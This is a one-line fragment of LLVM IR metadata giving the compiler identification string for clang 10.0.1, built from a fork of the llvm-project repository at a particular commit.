!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
